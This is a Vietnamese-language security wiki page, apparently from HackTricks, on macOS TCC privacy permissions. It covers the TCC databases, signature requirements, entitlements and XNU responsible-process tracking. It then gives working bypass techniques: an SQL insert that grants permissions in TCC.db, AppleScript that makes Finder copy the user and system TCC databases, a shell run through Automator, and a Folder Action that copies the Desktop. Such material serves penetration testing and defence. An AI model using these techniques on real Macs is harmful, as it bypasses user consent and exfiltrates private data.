# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Thông tin cơ bản**

**TCC (Transparency, Consent, and Control)** là một giao thức bảo mật tập trung vào việc quản lý quyền của ứng dụng. Vai trò chính của giao thức này là bảo vệ các tính năng nhạy cảm như **dịch vụ định vị, danh bạ, ảnh, microphone, camera, trợ năng và quyền truy cập toàn bộ ổ đĩa**. Bằng cách yêu cầu người dùng đồng ý rõ ràng trước khi cấp cho ứng dụng quyền truy cập vào những tính năng này, TCC tăng cường quyền riêng tư và khả năng kiểm soát dữ liệu của người dùng.

Người dùng sẽ gặp TCC khi ứng dụng yêu cầu quyền truy cập vào các tính năng được bảo vệ. Yêu cầu này hiển thị dưới dạng lời nhắc cho phép người dùng **chấp thuận hoặc từ chối quyền truy cập**. Ngoài ra, TCC hỗ trợ các thao tác trực tiếp của người dùng, chẳng hạn như **kéo và thả tệp vào ứng dụng**, để cấp quyền truy cập vào các tệp cụ thể, đảm bảo ứng dụng chỉ truy cập được những gì được cho phép rõ ràng.

![Ví dụ về lời nhắc TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** được xử lý bởi **daemon** nằm tại `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` và được cấu hình trong `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (đăng ký mach service `com.apple.tccd.system`).

Một **tccd ở chế độ user** chạy cho mỗi người dùng đã đăng nhập, được định nghĩa trong `/System/Library/LaunchAgents/com.apple.tccd.plist`, đăng ký các mach service `com.apple.tccd` và `com.apple.usernotifications.delegate.com.apple.tccd`.

Tại đây, bạn có thể thấy tccd chạy dưới dạng system và user:

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

Quyền được **kế thừa từ ứng dụng cha** và được **theo dõi** dựa trên **Bundle ID** và **Developer ID**.

### Cơ sở dữ liệu TCC

Các quyền cho phép/từ chối sau đó được lưu trong một số cơ sở dữ liệu TCC:

- Cơ sở dữ liệu toàn hệ thống tại **`/Library/Application Support/com.apple.TCC/TCC.db`** .
  - Cơ sở dữ liệu này được **SIP bảo vệ**, vì vậy chỉ có thể ghi vào đó khi bypass SIP.
- Cơ sở dữ liệu TCC của người dùng **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** dành cho tùy chọn riêng của từng người dùng.
  - Cơ sở dữ liệu này được bảo vệ, vì vậy chỉ các tiến trình có đặc quyền TCC cao như Full Disk Access mới có thể ghi vào đó (nhưng không được SIP bảo vệ).

> [!WARNING]
> Các cơ sở dữ liệu trên cũng được **TCC bảo vệ quyền đọc**. Vì vậy, bạn **không thể đọc** cơ sở dữ liệu TCC của người dùng thông thường, trừ khi thao tác đó được thực hiện từ một tiến trình có đặc quyền TCC.
>
> Tuy nhiên, hãy nhớ rằng một tiến trình có các đặc quyền cao này (như **FDA** hoặc **`kTCCServiceEndpointSecurityClient`**) có thể ghi vào cơ sở dữ liệu TCC của người dùng

- Có **cơ sở dữ liệu TCC thứ ba** tại **`/var/db/locationd/clients.plist`**, dùng để chỉ định các client được phép **truy cập dịch vụ định vị**.
- **`/Library/Application Support/com.apple.TCC/REG.db`** ghi lại các đường dẫn cơ sở dữ liệu TCC đã đăng ký. Cơ sở dữ liệu của người dùng được cài cắm có thể bị từ chối nếu chưa được đăng ký; chỉ biết đường dẫn này không cấp quyền truy cập vào cơ sở dữ liệu nào.<sup>[[6]](#references)</sup>
- **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`** chứa các quyết định PPPC (Privacy Preferences Policy Control) do tổ chức quản lý. Hãy kiểm tra tệp này khi một ứng dụng có quyền được cấp theo chính sách quản lý nhưng quyền đó không xuất hiện trong các hàng `access` thông thường.<sup>[[7]](#references)</sup>
- Tệp được SIP bảo vệ **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (nhưng ai cũng có thể đọc) là danh sách cho phép các ứng dụng cần ngoại lệ TCC.

> [!TIP]
> Cơ sở dữ liệu TCC trong **iOS** nằm tại **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> **Giao diện người dùng của Notification Center** có thể **thực hiện thay đổi trong cơ sở dữ liệu TCC của hệ thống**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Tuy nhiên, người dùng có thể **đặt lại các quy tắc** bằng tiện ích dòng lệnh **`tccutil`**; tiện ích này không có thao tác truy vấn được tài liệu hóa.<sup>[[4]](#references)</sup>

#### Truy vấn các cơ sở dữ liệu

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> Kiểm tra cả hai cơ sở dữ liệu để biết ứng dụng đã được cấp, bị từ chối hoặc chưa có quyền nào (ứng dụng sẽ yêu cầu quyền đó).

- **`service`** là biểu diễn dạng chuỗi của **quyền** TCC
- **`client`** là **bundle ID** hoặc **đường dẫn đến tệp nhị phân** có các quyền đó
- **`client_type`** cho biết đó là Bundle Identifier (0) hay đường dẫn tuyệt đối (1)

<details>

<summary>Cách thực thi nếu đó là đường dẫn tuyệt đối</summary>

Chỉ cần chạy **`launctl load you_bin.plist`**, với một plist như sau:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- **`auth_value`** có thể có các giá trị khác nhau: denied(0), unknown(1), allowed(2) hoặc limited(3).
- **`auth_reason`** có thể nhận các giá trị sau: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Trường **csreq** dùng để cho biết cách xác minh binary cần thực thi và cấp quyền TCC:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- Để biết thêm thông tin về **các trường khác** trong bảng, [**hãy xem bài viết này trên blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Bạn cũng có thể kiểm tra các quyền **đã được cấp** cho ứng dụng tại `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Người dùng có thể **đặt lại** các quy tắc bằng `tccutil`, nhưng cần kiểm tra các cơ sở dữ liệu để truy vấn quyền đã cấp.<sup>[[4]](#references)</sup>

#### Đặt lại quyền TCC

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### Xác định quyền cấp cho bên gửi và đích của Apple Events

Quyền Automation là quyết định **sender-to-target**, không phải quyền kiểm soát mọi ứng dụng. Khi có quyền truy cập cơ sở dữ liệu của người dùng, hãy liệt kê các cặp sender/target được cho phép trước khi thử các quy trình [Apple Events](macos-apple-events.md) hoặc Finder bên dưới. `csreq` xác định sender và `indirect_object_code_identity` xác định target; giải mã blob khác null bằng phương thức `csreq` ở trên.<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### Kiểm tra chữ ký TCC

**Cơ sở dữ liệu** TCC lưu trữ **Bundle ID** của ứng dụng, đồng thời **lưu** **thông tin** về **chữ ký** để **đảm bảo** ứng dụng yêu cầu sử dụng quyền là ứng dụng chính xác.

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> Do đó, các ứng dụng khác sử dụng cùng tên và bundle ID sẽ không thể truy cập các quyền đã cấp cho ứng dụng khác.

### Entitlements & TCC Permissions

Một quyền TCC không ghi đè các giới hạn của **App Sandbox**. Một camera client chạy trong sandbox cần `com.apple.security.device.camera`; Apple cũng cung cấp capability này cho các ứng dụng Hardened Runtime. Không entitlement nào trong số này bỏ qua hộp thoại yêu cầu người dùng đồng ý riêng. Đừng xem entitlement của sandbox là điều kiện bắt buộc tuyệt đối đối với mọi tiến trình không chạy trong sandbox. Khi một yêu cầu thất bại, hãy kiểm tra cả entitlements của executable lẫn ứng dụng chịu trách nhiệm.<sup>[[8]](#references)[[9]](#references)</sup>

Lưu ý rằng entitlements là các tệp plist, thuộc về code sig, được hash thêm trong code sig bằng các slot đặc biệt và có thể được truy vấn trong kernel bởi mã kernel hoặc bởi mã user mode bằng `csops(#169)` hoặc `csops_audittoken(#170)`.

Tuy nhiên, để **truy cập** vào **một số thư mục của người dùng**, chẳng hạn như `~/Desktop`, `~/Downloads` và `~/Documents`, các ứng dụng **không cần** bất kỳ **entitlement** cụ thể nào. Hệ thống sẽ tự xử lý việc truy cập và **nhắc người dùng** khi cần.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Các ứng dụng của Apple **sẽ không hiển thị lời nhắc**. Chúng có **các quyền được cấp trước** trong danh sách **entitlements**, nghĩa là chúng **sẽ không bao giờ hiển thị cửa sổ bật lên**, **cũng không** xuất hiện trong bất kỳ **cơ sở dữ liệu TCC** nào. Ví dụ:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

Điều này sẽ ngăn Calendar yêu cầu người dùng cấp quyền truy cập vào reminders, calendar và sổ địa chỉ.

> [!TIP]
> Ngoài một số tài liệu chính thức về entitlements, bạn cũng có thể tìm thấy **thông tin thú vị không chính thức về entitlements tại** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Một số quyền TCC là: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Không có danh sách công khai nào liệt kê tất cả các quyền này, nhưng bạn có thể xem [**danh sách các quyền đã biết**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Các vị trí nhạy cảm không được bảo vệ

- $HOME (chính nó)
- $HOME/.ssh, $HOME/.aws, v.v.
- /tmp

### Ý định của người dùng / com.apple.macl

Như đã đề cập trước đó, có thể **cấp quyền truy cập vào một file cho App bằng cách kéo và thả file đó vào App**. Quyền truy cập này sẽ không được ghi trong bất kỳ cơ sở dữ liệu TCC nào mà được lưu dưới dạng **thuộc tính mở rộng** của file. Thuộc tính này sẽ **lưu UUID** của App được cấp quyền:<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> Điều đáng chú ý là thuộc tính **`com.apple.macl`** được quản lý bởi **Sandbox**, chứ không phải tccd.
>
> Cũng lưu ý rằng nếu bạn chuyển một tệp cho phép UUID của một ứng dụng trên máy tính sang một máy tính khác, ứng dụng đó sẽ không được cấp quyền truy cập vì cùng một ứng dụng sẽ có UID khác.

Thuộc tính mở rộng `com.apple.macl` **không thể bị xóa** như các thuộc tính mở rộng khác vì nó được **SIP bảo vệ**. Tuy nhiên, như [**đã giải thích trong bài đăng này**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), có thể vô hiệu hóa thuộc tính này bằng cách **nén** tệp, **xóa** tệp rồi **giải nén**.<sup>[[3]](#references)</sup>






## Cơ chế tiến trình chịu trách nhiệm của XNU

Trong macOS/iOS, cơ chế **tiến trình chịu trách nhiệm** là một tính năng bảo mật quan trọng được framework **TCC (Transparency, Consent, and Control)** và các hệ thống bảo mật khác sử dụng để theo dõi tiến trình chịu trách nhiệm cuối cùng cho một hành động, kể cả khi hành động đó đi qua một chuỗi tiến trình con.

Khi TCC kiểm tra quyền (ví dụ: camera, microphone, vị trí), nó không phải lúc nào cũng kiểm tra tiến trình trực tiếp gửi yêu cầu. Thay vào đó, nó kiểm tra **tiến trình chịu trách nhiệm** — thường là ứng dụng GUI đã khởi tạo hành động đó, ngay cả khi yêu cầu thực tế đến từ một tiến trình trợ giúp hoặc daemon.

Để xác định ứng dụng thực sự được gán cho một yêu cầu, hãy stream các thông báo `AttributionChain` của TCC trong khi kích hoạt thao tác được bảo vệ. Cách này đáng tin cậy hơn việc cấp quyền cho tệp thực thi trợ giúp chỉ vì nó đã gọi API. Hãy đối chiếu danh tính được báo cáo với bundle ID hoặc đường dẫn, cùng với yêu cầu ký mã trong hàng `access` tương ứng.<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>Cách thiết lập Responsible Process</summary>

### Các trường cấu trúc tiến trình

Mỗi tiến trình trong XNU duy trì hai mã định danh UUID quan trọng:

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**: UUID của tiến trình (từ lệnh tải `LC_UUID` trong binary Mach-O của tiến trình)
- **`p_responsible_pid`**: PID của tiến trình chịu trách nhiệm
- **`p_responsible_uuid`**: UUID của tiến trình chịu trách nhiệm (vẫn được giữ lại ngay cả sau khi tiến trình đó kết thúc)

### Cách thiết lập tiến trình chịu trách nhiệm

1. **Trong quá trình tạo tiến trình (Fork)**

Khi một tiến trình mới được tạo thông qua `fork()` hoặc `posix_spawn()`, tiến trình chịu trách nhiệm được kế thừa từ tiến trình cha (lệnh gọi hệ thống `exec()` sử dụng lại cấu trúc `proc` hiện có, vì vậy bước này không được lặp lại tại đó):

**Vị trí**: `bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**Các điểm chính:**
- Các tiến trình con **kế thừa** `p_responsible_pid` của tiến trình cha
- Điều này tạo ra một **chuỗi trách nhiệm** xuyên suốt hệ thống phân cấp tiến trình
- Tiến trình chịu trách nhiệm thường trỏ đến ứng dụng GUI ban đầu

2. **Hàm cốt lõi: `proc_set_responsible_pid()`**

**Vị trí**: `bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**Chức năng của hàm này:**
1. **Đặt PID chịu trách nhiệm** trong tiến trình đích
2. **Tra cứu tiến trình chịu trách nhiệm** bằng `proc_find()` (tăng số lượng tham chiếu)
3. **Sao chép UUID** từ `p_uuid` của tiến trình chịu trách nhiệm sang `p_responsible_uuid` của tiến trình đích
4. **Giải phóng tham chiếu** bằng `proc_rele()` (giảm số lượng tham chiếu)

3. **Tại sao lưu cả PID và UUID?**

Cách lưu trữ kép này giải quyết một vấn đề nghiêm trọng:

| Trường | Mục đích | Vấn đề | Giải pháp |
|-------|----------|---------|----------|
| `p_responsible_pid` | Tra cứu nhanh tiến trình hiện tại | PID có thể được tái sử dụng sau khi tiến trình kết thúc | Dùng để tra cứu tiến trình đang hoạt động |
| `p_responsible_uuid` | Nhận dạng lâu dài | Vẫn tồn tại sau khi tiến trình kết thúc | Dùng cho kiểm tra bảo mật và kiểm toán |

**Vấn đề**: Nếu tiến trình chịu trách nhiệm kết thúc trước tiến trình con, PID có thể được tái cấp phát cho một tiến trình hoàn toàn khác.

**Giải pháp**: UUID là bất biến và nhận dạng duy nhất binary cụ thể đã chịu trách nhiệm, ngay cả sau khi tiến trình đó kết thúc.

### Luồng tạo tiến trình

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### Nguồn UUID: Load Command LC_UUID

UUID được lưu trong `p_uuid` lấy từ **load command `LC_UUID` của executable Mach-O**:

1. **Thời điểm biên dịch**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **Thời gian thực thi**

**Vị trí**: `bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **Được lưu trong cấu trúc tiến trình**

**Location**: `bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**Vị trí**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Chèn vào TCC

Nếu tại một thời điểm nào đó bạn có thể ghi vào cơ sở dữ liệu TCC, bạn có thể dùng cách sau để thêm một mục (xóa các comment):

<details>

<summary>Ví dụ chèn vào TCC</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### TCC Payloads

Nếu bạn đã xâm nhập được vào một app có một số quyền TCC, hãy xem trang sau về các TCC payload để khai thác chúng:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Tìm hiểu về Apple Events tại:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) để có FDA\*

Tên TCC của quyền Automation là: **`kTCCServiceAppleEvents`**\
Quyền TCC cụ thể này cũng xác định **ứng dụng có thể được quản lý** trong cơ sở dữ liệu TCC (do đó, quyền này không cho phép quản lý mọi thứ).

**Finder** là ứng dụng **luôn có FDA** (ngay cả khi không xuất hiện trong giao diện người dùng), vì vậy nếu bạn có đặc quyền **Automation** đối với ứng dụng này, bạn có thể lạm dụng các đặc quyền đó để **khiến ứng dụng thực hiện một số hành động**.\
Trong trường hợp này, app của bạn cần có quyền **`kTCCServiceAppleEvents`** đối với **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

Một biến thể ghi được báo cáo, khi có sẵn đường dẫn Automation đến Finder, là yêu cầu Finder **đổi tên thư mục `com.apple.TCC` của người dùng**. Sau đó, cơ sở dữ liệu trong đường dẫn đã đổi tên được sao chép vào thư mục staging, chỉnh sửa tại đó, sao chép trở lại và khôi phục tên thư mục. Hàng `kTCCServiceAppleEvents` mới phải xác định **cả binary gửi lẫn Finder**, bao gồm các yêu cầu code của chúng; cấp quyền cho sender mà không có danh tính của target thì không tương đương. Đây là kỹ thuật phụ thuộc vào đường dẫn, vì vậy hãy kiểm tra trên phiên bản macOS mục tiêu thay vì cho rằng chỉ cần quyền Automation của Finder là có thể ghi tùy ý vào cơ sở dữ liệu.<sup>[[11]](#references)</sup>

> [!WARNING]
> Với quyền này, bạn có thể **yêu cầu Finder truy cập các thư mục bị TCC hạn chế** và đưa các tệp cho bạn, nhưng theo tôi biết, bạn **không thể khiến Finder thực thi code tùy ý** để lạm dụng toàn bộ quyền FDA của nó.
>
> Do đó, bạn sẽ không thể lạm dụng toàn bộ khả năng của FDA.

Đây là lời nhắc TCC để cấp quyền Automation đối với Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Lưu ý rằng vì ứng dụng **Automator** có quyền TCC **`kTCCServiceAppleEvents`**, ứng dụng này có thể **điều khiển bất kỳ ứng dụng nào**, chẳng hạn như Finder. Vì vậy, nếu có quyền điều khiển Automator, bạn cũng có thể điều khiển **Finder** bằng đoạn code bên dưới:

<details>

<summary>Mở shell bên trong Automator</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

Điều tương tự cũng xảy ra với **ứng dụng Script Editor**: ứng dụng này có thể điều khiển Finder, nhưng bạn không thể dùng AppleScript để buộc ứng dụng chạy một script.

### Tự động hóa (SE) tới một số TCC

**System Events có thể tạo Folder Actions, và Folder Actions có thể truy cập một số thư mục TCC** (Desktop, Documents & Downloads), vì vậy có thể dùng một script như sau để lợi dụng hành vi này:

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**) tới FDA\*

